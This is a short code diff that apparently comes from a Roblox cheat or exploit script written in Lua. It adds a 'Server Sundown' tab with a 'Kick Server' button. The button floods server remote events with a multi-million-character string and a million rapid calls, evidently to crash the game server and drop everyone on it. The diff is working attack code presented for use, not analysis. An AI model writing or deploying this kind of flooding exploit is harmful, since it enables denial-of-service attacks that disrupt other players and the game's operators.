@@ -36083,6 +36083,25 @@ Escape Timer: %*]]
 				tbl9.LoboStrength = arg / 3
 			end,
 		})
+local SERVER = v20:AddTab("Server Sundown", "flask-conical")
+SERVER:AddButton({
+	Text = "Kick Server",
+	DoubleClick = true,
+	Func = function()
+		local RS = game:GetService("ReplicatedStorage")
+		local Event1 = RS:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
+		Event1:FireServer(("ALPHA"):rep(1e6))
+
+		task.wait()
+
+		local Event = RS:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
+		Event:FireServer(("AAAA"):rep(1))
+
+		for i = 1, 1e6 do
+			Event:FireServer()
+		end
+	end,
+})
 	end
 
 	do
